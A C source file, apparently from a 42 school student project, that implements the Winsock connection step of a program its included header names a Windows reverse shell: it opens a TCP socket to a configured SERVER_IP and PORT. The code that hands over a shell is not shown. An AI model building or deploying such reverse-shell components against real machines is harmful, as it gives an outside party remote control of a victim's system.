/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   winsock_client_connection.c                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/10 22:38:39 by joesanto          #+#    #+#             */
/*   Updated: 2026/01/11 01:35:24 by joesanto         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "windows_reverse_shell.h"

int	winsock_client_connection(SOCKET *client_fd)
{
	WSADATA				wsa;
	struct sockaddr_in	server_addr;

	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(PORT);
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
		return (WSAGetLastError());
	*client_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (*client_fd == INVALID_SOCKET)
		return (WSAGetLastError());
	if (InetPtonA(AF_INET, SERVER_IP, &server_addr.sin_addr) != 1)
	{
		closesocket(*client_fd);
		return (WSAGetLastError());
	}
	if (connect(*client_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR)
	{
		closesocket(*client_fd);
		return (WSAGetLastError());
	}
	return (SUCCESS);
}
